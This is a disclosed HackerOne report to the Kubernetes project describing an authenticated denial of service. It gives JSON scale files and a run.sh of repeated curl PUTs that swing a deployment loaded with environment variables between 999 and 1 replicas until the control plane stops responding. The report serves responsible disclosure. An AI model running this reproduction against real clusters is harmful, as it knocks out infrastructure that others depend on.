# "Self" DOS with large deployment and scaling

## Report Details
- **Report ID**: 831654
- **URL**: https://hackerone.com/reports/831654
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-03-25T21:39:21.174Z
- **Disclosed**: 2020-07-23T21:42:53.392Z

## Reporter
- **Username**: wiardvanrij
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: kubernetes

## Vulnerability Information
Report Submission Form

## Summary:
Good day! 
I was just messing around with some functions and trying to see what the impact was on my cluster. I found out that it took quite some resources to process a larger deployment, especially when scaling it. 
When I check your security release process I noticed that it did include "Authenticated User" - DOS (https://github.com/kubernetes/security/blob/master/security-release-process.md#denial-of-service) so I figured I should just make a report of this.

The summary is: 

When you define a deployment that contains loads of env variables, we can easily increase the size of what is being processed. When we start to scale & downscale this deployment, we get a massive increase in the API/ETCD memory & CPU usage. 

In my case, I literally ruined my cluster that consists of 3 master nodes (4 vCPUs, 15 GB memory each)

## Kubernetes Version:
1.15.10

## Component Version:

## Steps To Reproduce:

Short story:

  1. Create a deployment that is near to the max chars allowed with env vars.
  1. Scale it to N-number of nodes where N could be "whatever" - I've tested it with 99 nodes and 999, both seem to be increasing cluster usage
  1. Scale it back down to 1
  1. Repeat for a while.

Long story:

1  Create a deployment

Please check out my example deployment file here: https://gist.github.com/wiardvanrij/21e516993603282e174da399002d95a3
As it is really huge.
It is good to note that I just used a random image and defined really low cpu/mem limits in order to allow many pods to get created without hitting some cluster/node limit

 2   Save this as `scale.json`

```
{
    "kind": "Scale",
    "apiVersion": "autoscaling/v1",
    "metadata": {
      "name": "nginx",
      "namespace": "default"
    },
    "spec": {
      "replicas": 999
    }
}  
```

3  And save this as `scaledown.json`

```
{
    "kind": "Scale",
    "apiVersion": "autoscaling/v1",
    "metadata": {
      "name": "nginx",
      "namespace": "default"
    },
    "spec": {
      "replicas": 1
    }
}  
```
4 create a `run.sh`

```
curl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H "Content-Type: application/json" -d @scale.json
curl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H "Content-Type: application/json" -d @scaledown.json
curl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H "Content-Type: application/json" -d @scale.json
curl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H "Content-Type: application/json" -d @scaledown.json
curl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H "Content-Type: application/json" -d @scale.json
curl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H "Content-Type: application/json" -d @scaledown.json
... repeat above for a bunch of times (50x or so).
```

5 I've used kube proxy for easy access

run `kubectl proxy` to make a proxy to your cluster

6 run the run.sh file
`./run.sh`  and optionally you could run this multiple times for some "concurrency" 

7 What you could see

Massive usage in CPU power on the master nodes AND memory usage on for certain the API part of k8s, perhaps the nodes too, but I lost control of everything to see exactly what went down.
Eventually, you should not able to contact your cluster anymore and the nodes remain unresponsive/heavy throttled. 

## Notes

This feels really "basic" as for a DOS, though I really wanted to point something out.
I was actually learning deeper internals of k8s and I just made this "work" when I saw some spikes in my metrics. Therefore I wanted to make the note that:
- I actually made my cluster completely useless with this, but I'm uncertain if the ENV vars and/or the scaling are the sole reason.
- I've got no idea what is really happening, because even when I stopped my "script" - the entire cluster was still unresponsive.
- I've first tested this locally with KIND, and used KOPS to set up a "production like" cluster, and even with 3 somewhat decent master nodes, it was gone in minutes.


## Supporting Material/References:
Deployment file:
https://gist.github.com/wiardvanrij/21e516993603282e174da399002d95a3

## Impact

DOS on the entire k8s cluster.

## Attachments
No attachments
